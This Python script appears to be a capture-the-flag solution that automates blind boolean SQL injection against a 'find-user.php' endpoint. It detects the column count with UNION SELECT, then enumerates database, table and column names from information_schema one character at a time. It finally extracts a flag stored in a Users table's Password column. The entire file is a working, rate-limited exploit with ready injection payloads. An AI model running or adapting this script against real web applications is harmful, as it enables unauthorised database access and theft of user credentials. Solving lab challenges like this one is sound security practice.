import time
import string
from init import login, domain, flag_pattern


find_user_url = domain + "find-user.php"
char_pool = string.ascii_letters + string.punctuation + string.digits
true = "true"
rate = 300


def get_num_col():
    session = login()
    print("Detect #COL ...")
    num_col = 1
    query = "' union select 1"
    while True:
        params = {"username": f"{query}#"}
        resp = session.get(find_user_url, params=params)
        if resp.status_code == 200:
            print(f"#COL = {num_col}")
            break
        num_col += 1
        query += f", {num_col}"
    session.close()
    return num_col


def find_col_has_flag():
    session = login()
    print("Finding which column may contains a flag ...")
    table_col = {
        "Trainings": ["Id, Name, Description"],
        "Users": ["Id", "Username", "Password", "Website", "Probation", "Roles", "API"],
        "testing": ["id", "msg"]
    }
    res = []
    delay = 60 / rate
    last_req_time = time.monotonic() - delay
    for table, cols in table_col.items():
        for col in cols:
            query = f'''' union select 1, 2, 3 from (select group_concat({col} separator ',') as res
                          from Secure.{table} where Password like '%FLAG%')
                          as q where binary substring(res, 1, 1) = 'F'#'''
            params = {"username": query}
            elapsed_time = time.monotonic() - last_req_time
            if elapsed_time < delay:
                time.sleep(delay - elapsed_time)
            last_req_time = time.monotonic()
            resp = session.get(find_user_url, params=params)
            if resp.text == true:
                res.append(f"{table}.{col}")
    session.close()
    print(res)


def sqli_blind(query_type="DB", db_name=None, table_name=None, col_name=None):
    session = login()
    if query_type == "DB":
        print(f"Detecting database names ...")
    elif query_type == "Table":
        print(f"Detecting table names in database {db_name} ...")
    elif query_type == "Column":
        print(f"Detecting column names in {db_name}.{table_name}")
    elif query_type == "Flag":
        print(f"Extracting the flag in {db_name}.{table_name}.{col_name} ...")
    index = 1
    res = ""
    delay = 60 / rate
    last_req_time = time.monotonic() - delay
    while True:
        for char in char_pool:
            query = f'''' union select 1, 2, 3 from (select group_concat(schema_name separator ',') as res
                          from information_schema.schemata) as q where binary substring(res, {index}, 1) = '{char}'#'''
            if query_type == "Table":
                query = f'''' union select 1, 2, 3 from (select group_concat(table_name separator ',') as res
                              from information_schema.tables where table_schema='{db_name}')
                              as q where binary substring(res, {index}, 1) = '{char}'#'''
            elif query_type == "Column":
                query = f'''' union select 1, 2, 3 from (select group_concat(column_name separator ',') as res
                              from information_schema.columns where table_name = '{table_name}'
                              and table_schema='{db_name}') as q where binary substring(res, {index}, 1) = '{char}'#'''
            elif query_type == "Flag":
                query = f'''' union select 1, 2, 3 from (select group_concat({col_name} separator ',') as res
                              from {db_name}.{table_name} where Password like '%FLAG%')
                              as q where binary substring(res, {index}, 1) = '{char}'#'''
            params = {"username": query}

            elapsed_time = time.monotonic() - last_req_time
            if elapsed_time < delay:
                time.sleep(delay - elapsed_time)
            last_req_time = time.monotonic()

            resp = session.get(find_user_url, params=params)
            if resp.text == true:
                res += char
                index += 1
                # print(f"{res}")
                break
        else:
            print(f"Result: {res}\n")
            break
    session.close()
    return res


get_num_col()
sqli_blind()
sqli_blind("Table", db_name="Secure")

sqli_blind("Column", db_name="Secure", table_name="Trainings")
sqli_blind("Column", db_name="Secure", table_name="Users")
sqli_blind("Column", db_name="Secure", table_name="testing")

find_col_has_flag()
sqli_blind("Flag", db_name="Secure", table_name="Users", col_name="Password")
